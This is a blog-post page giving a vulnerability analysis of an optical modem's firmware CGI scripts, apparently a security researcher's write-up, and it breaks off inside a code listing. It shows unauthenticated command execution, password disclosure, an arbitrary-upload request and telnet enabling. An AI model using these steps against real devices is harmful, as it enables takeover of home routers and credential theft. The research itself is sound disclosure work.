@@ -1,0 +1,282 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>某系列光猫几处漏洞分析 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="审计">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2017-11-26">2017-11-26</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">某系列光猫几处漏洞分析</h2>
+            <div class="post-meta">
+                本文总共13425个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>拿到某光猫固件，大概看了下，用的是CGI+SH的编程方式，并且源代码都没有做权限的验证，相关代码也没有加密，所以分析也就简单了许多。</p>
+<p>下面我们来看下漏洞详情</p>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>漏洞在文件telnet.cgi文件中，首先文件判断是否为POST发包，如果是就进行处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$REQUEST_METHOD&quot; == &quot;POST&quot; ];then</span><br><span class="line">   settelnet</span><br><span class="line">else</span><br><span class="line">   gettelnet</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>我们跟进settelnet这个函数，进入函数后，看到函数调用了getpostdata.cgi这个文件对post包进行接收并赋值给QUERY_STRING变量，最终经过处理赋值给变量CGIParam.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">settelnet()</span><br><span class="line">&#123;</span><br><span class="line">	QUERY_STRING=`./getpostdata.cgi $CONTENT_LENGTH`</span><br><span class="line">	[ &quot;x$QUERY_STRING&quot; == &quot;x&quot; ] &amp;&amp; READERR=1</span><br><span class="line">	[ &quot;x$QUERY_STRING&quot; != &quot;x&quot; ] &amp;&amp; QUERY_STRING=`./urldecode.cgi $QUERY_STRING`</span><br><span class="line"></span><br><span class="line">paramIndex=&quot;1&quot;</span><br><span class="line">CGIParam=`echo &quot;$QUERY_STRING&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br></pre></td></tr></table></figure>
+<p>我们看看变量CGIParam被怎么处理，这里用了一个while判断变量$CGIParam是否有值，随后带入处理，可以看到这里把InputCmd的值给取出来，也就是执行的系统命令赋值给了INPUTCMD，我们往下看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while [ &quot;$CGIParam&quot; != &quot;&quot; ]</span><br><span class="line">    do</span><br><span class="line">    par=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 1`</span><br><span class="line">    val=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 2`</span><br><span class="line">    if [ &quot;$val&quot; != &quot;&quot; ]; then</span><br><span class="line">        case $par</span><br><span class="line">            in</span><br><span class="line">            &quot;InputCmd&quot;)</span><br><span class="line">            INPUTCMD=$val</span><br><span class="line">            INPUTCMD=`echo &quot;$INPUTCMD&quot; | sed &apos;s/%23/ /g&apos;`</span><br><span class="line">            ;;</span><br><span class="line">        esac</span><br><span class="line">    fi</span><br><span class="line">    paramIndex=$((paramIndex+1))</span><br><span class="line">    CGIParam=`echo &quot;$QUERY_STRING&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br><span class="line">    is_submit=&quot;1&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>这里把INPUTCMD的值写入到telnet_input.sh文件里面，随后对telnet_input.sh文件进行执行，执行结果输出到telnet_output.log文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$is_submit&quot; == &quot;1&quot; ]; then</span><br><span class="line">	rm /var/WEB-GUI/telnet_* &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    echo &quot;$&#123;INPUTCMD&#125;&quot; &gt;/var/WEB-GUI/telnet_input.log</span><br><span class="line">    echo &quot;$&#123;INPUTCMD&#125;&quot; &gt;/var/WEB-GUI/telnet_input.sh</span><br><span class="line">    chmod +x /var/WEB-GUI/telnet_input.sh</span><br><span class="line">	cd /var/WEB-GUI/</span><br><span class="line">    ./telnet_input.sh &gt;/var/WEB-GUI/telnet_output.log 2&gt;&amp;1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>由于执行后是没有回显的，所以在本地搭建个监听端来监听连接</p>
+<p><img src="/allimage/gmao/5.png" alt="5"></p>
+<p>后来在submit.cgi文件里发现，请求这个文件就能读取执行后的结果，所以要看到回显需要执行提交两次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo Content-type: text/html</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><br><span class="line">echo &quot;&lt;/body&gt;&lt;/html&gt;&quot;</span><br><span class="line">     </span><br><span class="line">	 echo &quot;</span><br><span class="line">	&lt;textarea rows=&apos;50&apos; cols=&apos;160&apos; name=&apos;text&apos;&gt;&quot;</span><br><span class="line">    while read line; do</span><br><span class="line">        echo &quot;$&#123;line&#125;&quot;</span><br><span class="line">    done &lt; /var/WEB-GUI/telnet_input.log 	</span><br><span class="line">    </span><br><span class="line">    while read line; do</span><br><span class="line">        echo &quot;$&#123;line&#125;&quot;</span><br><span class="line">    done &lt; /var/WEB-GUI/telnet_input.sh  </span><br><span class="line">     </span><br><span class="line">    while read line; do</span><br><span class="line">        echo &quot;$&#123;line&#125;&quot;</span><br><span class="line">    done &lt; /var/WEB-GUI/telnet_output.log</span><br></pre></td></tr></table></figure>
+<h3 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h3><p>漏洞在文件password_CM.cgi文件中，首先文件判断是否为POST发包，如果是就进行处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> if [ &quot;$REQUEST_METHOD&quot; == &quot;POST&quot; ];then</span><br><span class="line">	setpassword</span><br><span class="line">fi</span><br><span class="line">   </span><br><span class="line">getpassword</span><br></pre></td></tr></table></figure>
+<p>我们跟进setpassword函数,函数调用getpostdata.cgi文件对post进行接收，包赋值给LINE变量，处理后赋值给CGIParam变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setpassword()</span><br><span class="line">&#123;</span><br><span class="line">	LINE=`./getpostdata.cgi $CONTENT_LENGTH`</span><br><span class="line">	[ &quot;x$LINE&quot; == &quot;x&quot; ] &amp;&amp; READERR=1</span><br><span class="line">	[ &quot;x$LINE&quot; != &quot;x&quot; ] &amp;&amp; LINE=`./urldecode.cgi $LINE`</span><br><span class="line"></span><br><span class="line">	paramIndex=&quot;1&quot;</span><br><span class="line">	CGIParam=`echo &quot;$LINE&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br></pre></td></tr></table></figure>
+<p>这里还是是一个while来判断，一样是取出值然后进行处理，不过这里只能改密码，帐号是不能改的，代码被注释掉了。最后进行密码设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">while [ &quot;$CGIParam&quot; != &quot;&quot; ]</span><br><span class="line">	do</span><br><span class="line">	  par=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 1`</span><br><span class="line">	  val=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 2`</span><br><span class="line">	  if [ &quot;$val&quot; != &quot;&quot; ]; then</span><br><span class="line">		case $par</span><br><span class="line">			in</span><br><span class="line">#			&quot;password_username&quot;)</span><br><span class="line">#			USERNAME=$val</span><br><span class="line">#			;;</span><br><span class="line">			&quot;password_pass&quot;)</span><br><span class="line">			PASSWORD=$val</span><br><span class="line">			PASSWORD=`echo &quot;$PASSWORD&quot; | sed &apos;s/123fiberhome321/\&amp;/g&apos;`</span><br><span class="line">			PASSWORD=`echo &quot;$PASSWORD&quot; | sed &apos;s/321telecomadmin123/\!/g&apos;`</span><br><span class="line">			;;</span><br><span class="line">		esac</span><br><span class="line">	  fi</span><br><span class="line">	  paramIndex=$((paramIndex+1))</span><br><span class="line">	  CGIParam=`echo &quot;$LINE&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br><span class="line">	done</span><br><span class="line">	</span><br><span class="line">	RETURN_STR=`$INTER_WEB set $CMIGD_DI_XFIBCOMUA_Password &quot;$PASSWORD&quot;`</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行完后获取帐号密码，当然了，直接访问此页面也是可以获取帐号密码的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">getpassword()</span><br><span class="line">&#123;</span><br><span class="line">	USERNAME=`$INTER_WEB get $CMIGD_DI_XFIBCOMUA_UserName | cut -d &apos;&amp;&apos; -f 1`</span><br><span class="line">	PASSWORD=`$INTER_WEB get $CMIGD_DI_XFIBCOMUA_Password | sed &apos;s/&amp;$//&apos;`</span><br><span class="line"></span><br><span class="line">	echo &quot;</span><br><span class="line">	&#123;\&quot;RETURN\&quot;:</span><br><span class="line">	  &#123;\&quot;success\&quot;: true&#125;,</span><br><span class="line">	 \&quot;PASSWORD\&quot;:</span><br><span class="line">	  &#123;\&quot;password_username\&quot;:\&quot;$USERNAME\&quot;,</span><br><span class="line">	   \&quot;password_DLUSERNAME\&quot;:\&quot;$DLUSERNAME\&quot;,</span><br><span class="line">	   \&quot;password_area\&quot;:\&quot;$area\&quot;,</span><br><span class="line">	   \&quot;password_pass\&quot;:\&quot;$PASSWORD\&quot;&#125;</span><br><span class="line">	&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行结果</p>
+<p><img src="/allimage/gmao/3.jpg" alt="3"></p>
+<p><img src="/allimage/gmao/4.jpg" alt="4"></p>
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>漏洞文件在loadfile.cgi文件中，我们看到上传文件的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=\&quot;post\&quot; action=\&quot;../cgi-bin/uploadfile.htm.cgi\&quot; enctype=\&quot;multipart/form-data\&quot; onsubmit=\&quot;return JudgeKeywordImage(this);\&quot;&gt;</span><br><span class="line">		&lt;label class=&apos;trad&apos; key=&apos;paneltip_choose&apos;&gt;&lt;/label&gt;   </span><br><span class="line">		&lt;input size=50 name=\&quot;uploadfile\&quot; type=\&quot;file\&quot; $&#123;UPLOAD&#125;/&gt;</span><br><span class="line">		&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;label class=&apos;trad&apos; key=&apos;paneltip_path&apos;&gt;&lt;/label&gt;           </span><br><span class="line">		&lt;span&gt;&lt;input type=&apos;input&apos; name=\&quot;uploadpath\&quot; value=\&quot;/var/\&quot; style=\&quot;width:300px\&quot;&gt;&lt;/span&gt;</span><br><span class="line">		&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;input name=\&quot;submit\&quot; type=\&quot;submit\&quot; value=\&quot;上传\&quot; style=\&quot;height:23px\&quot; $&#123;UPLOAD&#125;/&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">		&lt;/blockquote&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>这里的数据包发送到uploadfile.htm.cgi文件，我们跟进，这里执行了uploadcgi.cgi这个cgi文件，这个文件是用来处理上传文件数据包的，这个文件是编译好了的ELF文件，我们逆向看看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./uploadcgi.cgi</span><br><span class="line">UPPATH=$GETCFG $&#123;BROANCONF&#125; upload</span><br><span class="line">if [ -f /var/Image ]; then</span><br><span class="line">	mv /var/Image $UPPATH &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">fi </span><br><span class="line">if [ -f $UPPATH ]; then</span><br><span class="line">	success=1</span><br><span class="line">else</span><br><span class="line">	success=0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>找到入口点，这里首先判断了是否是POST过来的数据包，如果不是就进入函数loc_400A34 中, 返回没有找到方法，继而退出，上传失败。如果是就进入数据包的处理loc_400A74这个函数里面</p>
+<p><img src="/allimage/gmao/1.jpg" alt="1"></p>
+<p><img src="/allimage/gmao/7.jpg" alt="7"></p>
+<p>loc_400A74函数主要对CONTENT_TYPE进行判断，比较CONTENT_TYPE是否是multipart/form-data类型，随后就是各个函数又进行了一系列的判断，文件主要判断了[Content-Type， REQUEST_METHOD ,CONTENT_LENGTH ,UPLOADPATH]                       </p>
+<p><img src="/allimage/gmao/2.jpg" alt="2"></p>
+<p>分析过程中发现程序并没有对文件类型做任何的限制，只是判断一些header类型，结合正常发包的数据包进行构造数据包，构造的数据包如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/uploadfile.htm.cgi HTTP/1.1</span><br><span class="line">Accept: text/html, application/xhtml+xml, */*</span><br><span class="line">Referer: http://10.214.99.131/index_main_CM</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Content-Type: multipart/form-data</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Host: 10.214.99.131</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=&quot;test.html&quot;</span><br><span class="line">Content-Type: text/html</span><br><span class="line">HGU TEST</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadpath&quot;</span><br><span class="line">/var/WEB-GUI/</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line">submit</span><br></pre></td></tr></table></figure>
+<p>上传结果</p>
+<p><img src="/allimage/gmao/6.jpg" alt="6"></p>
+<h3 id="开启Telnet"><a href="#开启Telnet" class="headerlink" title="开启Telnet"></a>开启Telnet</h3><p>在文件services_CM.cgi中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$REQUEST_METHOD&quot; == &quot;POST&quot; ];then</span><br><span class="line">   setservices</span><br><span class="line">else</span><br><span class="line">   getservices</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>首先判断是否POST提交，让你后执行setservices函数,我们跟进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">setservices()</span><br><span class="line">&#123;</span><br><span class="line">	QUERY_STRING=`./getpostdata.cgi $CONTENT_LENGTH`</span><br><span class="line">	[ &quot;x$QUERY_STRING&quot; == &quot;x&quot; ] &amp;&amp; READERR=1</span><br><span class="line">	[ &quot;x$QUERY_STRING&quot; != &quot;x&quot; ] &amp;&amp; QUERY_STRING=`./urldecode.cgi $QUERY_STRING`</span><br><span class="line"></span><br><span class="line">paramIndex=&quot;1&quot;</span><br><span class="line">CGIParam=`echo &quot;$QUERY_STRING&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br><span class="line">while [ &quot;$CGIParam&quot; != &quot;&quot; ]</span><br><span class="line">do</span><br><span class="line">	par=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 1`</span><br><span class="line">	val=`echo &quot;$CGIParam&quot; | cut -d &apos;=&apos; -f 2`</span><br><span class="line">	if [ &quot;$val&quot; != &quot;&quot; ]; then</span><br><span class="line">		case $par</span><br><span class="line">			in</span><br><span class="line">			&quot;action&quot;)</span><br><span class="line">			ACTION=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;ftpenable&quot;)</span><br><span class="line">			FTPENABLE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;tftpenable&quot;)</span><br><span class="line">			TFTPENABLE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;telnetenable&quot;)</span><br><span class="line">			TELNETENABLE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;dnsrelayenable&quot;)</span><br><span class="line">			DNSRELAYENABLE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;accessc&quot;)</span><br><span class="line">			ACCESSC=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;onlinenumber&quot;)</span><br><span class="line">			ONLINENUMBER=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;staticlimit&quot;)</span><br><span class="line">			STATICLIMIT=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;checkonline&quot;)</span><br><span class="line">			CHECKONLINE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;itmsen&quot;)</span><br><span class="line">			ITMSEN=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;tcqosenable&quot;)</span><br><span class="line">			TCQOSENABLE=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;broadcastEnable&quot;)</span><br><span class="line">			BroadcastEnable=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;broadcastswitch&quot;)</span><br><span class="line">			Broadcastswitch=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;APIEnable&quot;)</span><br><span class="line">			APIEnable=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;CODEEnable&quot;)</span><br><span class="line">			CODEEnable=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;CONFIGEnable&quot;)</span><br><span class="line">			CONFIGEnable=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;IntelligentEnable&quot;)</span><br><span class="line">			IntelligentEnable=$val</span><br><span class="line">			;;</span><br><span class="line">			&quot;CpuType&quot;)</span><br><span class="line">			CPUTYPE=$val</span><br><span class="line">			;;</span><br><span class="line">			esac</span><br><span class="line">		fi</span><br><span class="line">	paramIndex=$((paramIndex+1))</span><br><span class="line">	CGIParam=`echo &quot;$QUERY_STRING&amp;&quot; | cut -d &apos;&amp;&apos; -f $paramIndex`</span><br><span class="line">	is_submit=&quot;1&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>还是对参数进行赋值，然后带入循环进行处理，这里可以开启ftp,telnet等服务，都是以提交参数的方式，并没有过滤，来看下处理参数的过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 